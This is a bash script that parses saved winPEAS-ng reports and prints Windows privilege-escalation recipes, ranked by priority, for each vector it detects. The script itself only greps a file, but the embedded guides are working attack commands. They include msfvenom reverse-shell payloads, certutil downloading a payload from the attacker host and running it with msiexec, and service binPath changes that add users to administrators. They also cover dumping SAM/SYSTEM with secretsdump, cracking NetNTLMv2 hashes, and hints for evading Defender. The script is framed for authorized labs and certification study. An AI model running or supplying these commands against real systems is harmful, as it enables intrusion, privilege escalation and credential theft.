#!/usr/bin/env bash
#
# peas-triage.sh — winPEAS-ng output triage helper
# -----------------------------------------------------------------------------
# winPEAS output is enormous and paints almost everything red/yellow. This script
# reads a saved winPEAS-ng report and highlights only the lines that map to a
# known local privilege-escalation vector, with a short "how to exploit" note
# for each, and a priority-ordered summary at the end so you know what to try
# first instead of reading hundreds of lines by hand.
#
# It is READ-ONLY: it only greps a text file. It never runs anything against any
# host. Pattern strings are taken from real WinPEAS-ng output.
#
# Intended for authorized labs / CTFs / your own study (OSCP, HTB, PG, etc.).
#
# Works with WinPEAS-ng output (the current PEASS-ng release).
#
# Pick the right binary on the target (check the arch first):
#   echo %PROCESSOR_ARCHITECTURE%
#     AMD64 -> winPEASx64.exe
#     x86   -> winPEASx86.exe
#
# Download (from the target, PowerShell):
#   powershell -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe"
#   powershell -c "Invoke-WebRequest https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -OutFile winpeas.exe"
#
# Usage:
#   ./peas-triage.sh <winpeas_output.txt> [LHOST_IP]
#
#   # on the target, save a plain-text report:
#   winpeas.exe log=out.txt
#   # then copy out.txt to your box and run:
#   ./peas-triage.sh out.txt <VPN_IP>
#
# LHOST_IP is optional; if omitted, sample commands show <LHOST>. You can also
# set it via the LHOST env var:  LHOST=<VPN_IP> ./peas-triage.sh out.txt
# -----------------------------------------------------------------------------

# attacker IP for the sample payload commands (parameter > env > placeholder)
LHOST="${2:-${LHOST:-<LHOST>}}"

FILE="$1"
if [[ -z "$FILE" || ! -f "$FILE" ]]; then
    echo "Usage: $0 <winpeas_output.txt> [LHOST_IP]"
    exit 1
fi

# strip ANSI colour codes to a temp copy so grep matches cleanly
CLEAN="$(mktemp)"
trap 'rm -f "$CLEAN"' EXIT
sed -r 's/\x1B\[[0-9;]*[mKGH]//g' "$FILE" > "$CLEAN"

# colours for this script's own output
R=$'\e[1;31m'; G=$'\e[1;32m'; Y=$'\e[1;33m'; C=$'\e[1;36m'; B=$'\e[1;34m'; N=$'\e[0m'

hit=0
# ranking rows: "WEIGHT|TITLE|hitcount"
declare -a RANKING

# -----------------------------------------------------------------------------
# check(): grep a (case-insensitive) pattern. On match, print the vector title,
# the matching lines (with line numbers) and the exploitation note, and record
# it for the final priority ranking.
#   $1 = pattern (grep -iF, or -iE if $5 == "E")
#   $2 = vector title
#   $3 = exploitation note (multiline)
#   $4 = WEIGHT 1-100 (reliability + speed; higher = try first)
#   $5 = "E" for extended regex, empty for fixed string
# -----------------------------------------------------------------------------
check() {
    local pat="$1" title="$2" guide="$3" weight="$4" mode="$5"
    local matches
    if [[ "$mode" == "E" ]]; then
        matches="$(grep -niE "$pat" "$CLEAN")"
    else
        matches="$(grep -niF "$pat" "$CLEAN")"
    fi
    if [[ -n "$matches" ]]; then
        hit=1
        local total; total="$(echo "$matches" | wc -l)"
        RANKING+=("${weight}|${title}|${total}")
        echo
        echo "${R}==============================================================${N}"
        echo "${R}[+] $title   ${Y}(priority: $weight/100)${N}"
        echo "${R}==============================================================${N}"
        echo "${Y}--- matching lines ---${N}"
        echo "$matches" | head -15 | sed "s/^/${C}/; s/\$/${N}/"
        [[ "$total" -gt 15 ]] && echo "${Y}    ... (+$((total-15)) more lines)${N}"
        echo "${G}--- how to exploit ---${N}"
        echo "$guide"
    fi
}

echo "${B}#############################################################${N}"
echo "${B}#  PEAS TRIAGE — detected privilege-escalation vectors      #${N}"
echo "${B}#  file : $FILE${N}"
echo "${B}#  LHOST: $LHOST${N}"
echo "${B}#############################################################${N}"

# =====================================================================
# AlwaysInstallElevated (needs BOTH HKLM and HKCU)
# =====================================================================
if grep -qiF "AlwaysInstallElevated set to 1 in HKLM" "$CLEAN" && \
   grep -qiF "AlwaysInstallElevated set to 1 in HKCU" "$CLEAN"; then
check "AlwaysInstallElevated set to 1" \
"AlwaysInstallElevated (HKLM + HKCU = SYSTEM)" \
"  # attacker
  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o exploit.msi
  python3 -m http.server 80
  nc -lvnp 4444
  # target
  certutil -urlcache -split -f http://$LHOST/exploit.msi C:\\Users\\Public\\exploit.msi
  msiexec /quiet /qn /i C:\\Users\\Public\\exploit.msi
  -> SYSTEM" "90"
else
    if grep -qiF "AlwaysInstallElevated set to 1" "$CLEAN"; then
        echo
        echo "${Y}[!] AlwaysInstallElevated present but NOT in both hives (HKLM & HKCU). Needs both to work.${N}"
    fi
fi

# =====================================================================
# Token privileges
# =====================================================================
check "Se(Impersonate|AssignPrimaryToken|Backup|Restore|LoadDriver|TakeOwnership|Debug|CreateToken)Privilege" \
"Exploitable token privilege (whoami /priv)" \
"  SeImpersonate / SeAssignPrimaryToken -> GodPotato / PrintSpoofer -> SYSTEM
  SeBackup  -> reg save hklm\\sam + hklm\\system -> secretsdump
  SeRestore -> write any file (utilman/sethc swap trick)
  SeTakeOwnership -> takeown a privileged binary and replace it
  SeLoadDriver -> load a vulnerable driver (EoP)" "95" "E"

# =====================================================================
# Service: writable binary / weak file perms
# =====================================================================
check "File Permissions: (Everyone|Users|Authenticated Users)" \
"Writable binary/folder (service binary overwrite / DLL hijack)" \
"  Confirm it belongs to a service running as LocalSystem:
    sc qc <service>
    icacls \"C:\\path\\binary.exe\"
  If the binary is writable by you and the service is SYSTEM:
    msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe-service -o s.exe
    copy /Y s.exe \"C:\\path\\binary.exe\"
    sc stop <service> & sc start <service>
  NOTE: 'Authenticated Users [WriteData/CreateFiles]' on a FOLDER is usually
  DLL hijacking, not exe overwrite (see the DLL Hijacking section)." "60" "E"

# =====================================================================
# Unquoted service path
# =====================================================================
check "Unquoted and Space detected|No quotes and Space detected|Unquoted" \
"Unquoted Service Path" \
"  sc qc <service>
  # drop your exe at the space break, in a writable folder:
  msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o Program.exe
  copy Program.exe \"C:\\Program.exe\"   (example)
  sc stop <service> & sc start <service>
  NOTE: many 'Unquoted' hits are Drivers32/ActiveSetup entries (not exploitable).
  Keep only the ones tied to a real SERVICE with a writable binPath." "55" "E"

# =====================================================================
# Service with weak DACL (config / start-stop)
# =====================================================================
check "SERVICE_CHANGE_CONFIG|SERVICE_ALL_ACCESS|WRITE_DAC|WRITE_OWNER|GenericWrite|GenericAll|can modify|CAN MODIFY OR START/STOP|GenericExecute (Start/Stop)" \
"Service with weak DACL (change config or start/stop)" \
"  If you have CHANGE_CONFIG on a SYSTEM service:
    sc config <service> binPath= \"C:\\Windows\\System32\\cmd.exe /c net localgroup administrators <user> /add\"
    sc stop <service> & sc start <service>
  Start/Stop only (GenericExecute) is NOT enough on its own: you also need to
  change the binary or the config. Confirm with:
    accesschk.exe -uwcqv <user> <service>" "65" "E"

# =====================================================================
# DLL hijacking (writable process folder)
# =====================================================================
check "Possible DLL Hijacking" \
"DLL Hijacking (a process/service folder is writable)" \
"  If the folder is loaded by a process running as admin/SYSTEM:
    msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o evil.dll
    copy evil.dll \"C:\\folder\\<expected_dll_name>.dll\"
    restart the service/app
  If the process runs as your own low-priv user, hijacking there does NOT
  escalate unless a SYSTEM service also loads that folder. Check who owns it." "50"

# =====================================================================
# Generic modifiable / writable
# =====================================================================
check "can be modified|Modifiable|you can write|folder is writable|writable by" \
"Modifiable/writable resource (check context)" \
"  Generic grep. It only matters if the resource is executed by a higher-priv
  user (scheduled-task script, another user's autorun, a SYSTEM service binary)." "40" "E"

# =====================================================================
# Autologon / registry creds
# =====================================================================
check "DefaultUserName|DefaultPassword|AutoLogon credentials|Looking for AutoLogon" \
"Autologon / credentials in registry" \
"  reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"
  If DefaultPassword is set: reuse it via runas / evil-winrm / RDP.
  (DefaultUserName without a password won't help by itself.)" "70" "E"

# =====================================================================
# cmdkey / stored credentials
# =====================================================================
check "cmdkey|Currently stored credentials|Saved RDP connections" \
"Stored credentials (runas /savecred)" \
"  cmdkey /list
  runas /savecred /user:Administrator \"C:\\Users\\Public\\rev.exe\"" "75" "E"

# =====================================================================
# NetNTLM hash captured
# =====================================================================
check "NetNTLMv2|Security Packages Credentials" \
"NetNTLMv2 hash captured (crack offline)" \
"  Copy the full 'Hash:' line to hash.txt on your box:
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  (format user::DOMAIN:challenge:hash:blob -> NetNTLMv2)" "72" "E"

# =====================================================================
# Credentials in files (classics)
# =====================================================================
check "password|passwd|pwd=|connectionString|cpassword|my\.ini|passwords\.txt" \
"Possible credentials in files" \
"  type C:\\xampp\\passwords.txt
  type C:\\xampp\\mysql\\bin\\my.ini
  findstr /si password C:\\*.txt C:\\*.ini C:\\*.config
  GPP cpassword -> gpp-decrypt <value>" "80" "E"

# =====================================================================
# unattend / sysprep / web.config
# =====================================================================
check "unattend\.xml|sysprep\.xml|sysprep\.inf|web\.config|RoamingCredentialSettings" \
"unattend / sysprep / web.config (install-time creds)" \
"  type C:\\Windows\\Panther\\Unattend.xml
  type C:\\Windows\\System32\\sysprep\\sysprep.inf
  # password is often base64:
  echo <b64> | base64 -d" "78" "E"

# =====================================================================
# PowerShell history / sensitive files
# =====================================================================
check "_history|ConsoleHost_history|\.kdbx|\.ovpn|id_rsa|PS history" \
"PS history / sensitive files (kdbx, ovpn, id_rsa)" \
"  type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
  .kdbx -> keepass (crack with keepass2john)
  id_rsa -> direct ssh" "68" "E"

# =====================================================================
# SAM / SYSTEM backups
# =====================================================================
check "SAM backup|SYSTEM backup|Found SAM|SAM & SYSTEM|common SAM" \
"Accessible SAM/SYSTEM copies" \
"  copy C:\\Windows\\Repair\\SAM  C:\\Users\\Public\\SAM
  copy C:\\Windows\\Repair\\SYSTEM C:\\Users\\Public\\SYSTEM
  # attacker
  impacket-secretsdump -sam SAM -system SYSTEM LOCAL" "77" "E"

# =====================================================================
# Scheduled tasks / other users' autoruns
# =====================================================================
check "Scheduled Applications|Task to|Autorun Applications|StubPath" \
"Scheduled task / autorun (writable script/binary run by another user)" \
"  schtasks /query /fo LIST /v | findstr /i \"TaskName Run Author\"
  If the executed file is writable by you and the task runs as admin,
  overwrite it with your payload and wait for the trigger.
  NOTE: your own HKCU autoruns do NOT escalate (you run them yourself)." "45" "E"

# =====================================================================
# Writable folders in PATH
# =====================================================================
check "PATH folders with write|Writable folders in PATH|write permissions in PATH" \
"Writable folder in PATH (DLL/EXE hijack via PATH)" \
"  echo %PATH%
  Drop rev.exe named as a binary invoked without a full path, or a DLL that is
  searched in PATH order." "48" "E"

# =====================================================================
# Home folders / other users' readable files
# =====================================================================
check "Home folders found|other users home|Administrator :" \
"Home folders (look for other users' readable files)" \
"  dir /a /s C:\\Users\\Administrator 2>nul
  Look for user.txt, creds, .kdbx, ssh keys, etc." "42" "E"

# =====================================================================
# HKLM keys writable by standard users
# =====================================================================
check "writable by standard users|HKLM.*FullControl|HKLM.*GenericAll|HKLM.*TakeOwnership|Modifiable registry autorun|Registry key with weak perms|change the registry of" \
"HKLM key writable by normal user (service/registry hijack)" \
"  If it's a SERVICE key (...\\Services\\<svc>\\ImagePath):
    reg add HKLM\\SYSTEM\\...\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d \"C:\\rev.exe\" /f
    sc start <svc>
  Many hits (DRM, Tracing, TypingInsights) are noise: they don't control
  privileged execution. Prioritise Services/ImagePath keys." "52" "E"

# =====================================================================
# AV / UAC / Firewall (context, not a direct vector)
# =====================================================================
check "AlwaysNotify|never notify|FirewallEnabled .*False|Defender" \
"AV/UAC/Firewall (evasion context, not a direct vector)" \
"  Firewall off = your reverse shell can egress on any port.
  Defender on = use obfuscated payloads / nim / donut if it flags you." "20" "E"

# =====================================================================
# Installed third-party apps (look for CVE)
# =====================================================================
check "Installed Applications|Program Files.*(FileZilla|xampp|foobar|mobaxterm|splunk|druva)" \
"Third-party app (search for a public exploit)" \
"  Note name + version and on your box:
    searchsploit <app> <version>
  e.g. old FileZilla Server stores creds in cleartext in its config XML." "58" "E"

# =====================================================================
# LAPS
# =====================================================================
check "LAPS Enabled|LAPS not installed|ms-Mcs-AdmPwd" \
"LAPS (if you can read the attribute you get the local admin password)" \
"  Domain-only. crackmapexec ldap <dc> -u u -p p -M laps" "30" "E"

# =====================================================================
# Kernel / vulnerable version (last resort)
# =====================================================================
check "known exploited vulnerabilities|OS Version:|Elevation of Privilege|Build 19" \
"OS version / possible kernel CVE (LAST resort)" \
"  Take 'OS Version' + hotfixes and run systeminfo through wesng:
    python3 wes.py systeminfo.txt
  Avoid kernel exploits unless nothing else works: they can crash the VM." "15" "E"

# -----------------------------------------------------------------------------
echo
if [[ "$hit" -eq 0 ]]; then
    echo "${Y}[!] No known pattern detected. Review the file manually.${N}"
    rm -f "$CLEAN"
    exit 0
fi

# -----------------------------------------------------------------------------
# PRIORITY RANKING: sort every detected vector by weight (higher = try first).
# -----------------------------------------------------------------------------
echo
echo "${B}#############################################################${N}"
echo "${B}#  RECOMMENDED ORDER (what to try first)                    #${N}"
echo "${B}#############################################################${N}"
echo

IFS=$'\n' sorted=($(printf '%s\n' "${RANKING[@]}" | sort -t'|' -k1 -nr)); unset IFS

rank=1
for entry in "${sorted[@]}"; do
    w="${entry%%|*}"; rest="${entry#*|}"; title="${rest%%|*}"; hits="${rest##*|}"
    if   (( w >= 75 )); then tag="${R}TRY NOW ${N}"; col="$R"
    elif (( w >= 55 )); then tag="${Y}GOOD    ${N}"; col="$Y"
    elif (( w >= 40 )); then tag="${C}REVIEW  ${N}"; col="$C"
    else                     tag="${B}LAST    ${N}"; col="$B"
    fi
    printf "  %2d. [%s] ${col}%-55s${N} (weight %2d, %s hits)\n" \
        "$rank" "$tag" "$title" "$w" "$hits"
    ((rank++))
done

echo
echo "${G}Priority legend:${N}"
echo "  ${R}TRY NOW${N} (75-95) fast & very reliable, start here"
echo "  ${Y}GOOD${N}    (55-74) reliable, confirm with sc qc/icacls then go"
echo "  ${C}REVIEW${N}  (40-54) may be noise, verify context"
echo "  ${B}LAST${N}    (15-39) evasion/kernel/domain, last resort"
echo
echo "${B}#############################################################${N}"
echo "${B}# Rule of thumb: if a vector doesn't land in ~10 min, move  #${N}"
echo "${B}# on. winPEAS has MANY false positives: confirm before use. #${N}"
echo "${B}#############################################################${N}"

rm -f "$CLEAN"
